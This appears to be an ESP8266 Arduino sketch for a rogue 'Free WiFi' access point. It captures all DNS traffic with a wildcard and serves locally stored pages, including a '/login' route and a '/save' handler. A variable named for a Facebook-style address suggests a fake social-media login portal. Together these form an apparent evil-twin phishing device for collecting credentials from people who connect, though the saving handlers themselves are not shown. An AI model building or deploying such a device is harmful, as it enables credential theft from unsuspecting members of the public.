#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include "Helpers.h"

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
IPAddress fbApIP(192, 168, 2, 1);
DNSServer dnsServer;

ESP8266WebServer server(80);

void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println();

  //Initialize File System
  SPIFFS.begin();
  Serial.println("File System Initialized");
  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    String fileName = dir.fileName();
    size_t fileSize = dir.fileSize();
    Serial.printf("FS File: %s, size: %s\n", fileName.c_str(), formatBytes(fileSize).c_str());
  }
  Serial.printf("\n");

  //Initialize AP Mode
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Free WiFi");

  dnsServer.start(DNS_PORT, "*", apIP);

  //Initialize Webserver
  server.on("/", HTTP_GET, []() {
    if (!handleFileRead(server.uri())) {
      server.send(200, "text/plain", "FileNotFound");
    }
  });

  server.onNotFound([]() {
  Serial.println(server.uri());
  if (!handleFileRead(server.uri())) {
    server.send(200, "text/plain", "FileNotFound");
  }});

  server.on("/login", HTTP_GET, []() {
  Serial.println(server.uri());
    if (!handleFileRead(server.uri())) {
      server.send(200, "text/plain", "No login Found");
    }
  });

  server.on("/save", handleSave);
  server.on("/settings", handleSettings);
  server.on("/remove", handleRemove);

  server.begin();  
}

void loop() {
 dnsServer.processNextRequest();
 server.handleClient();
}
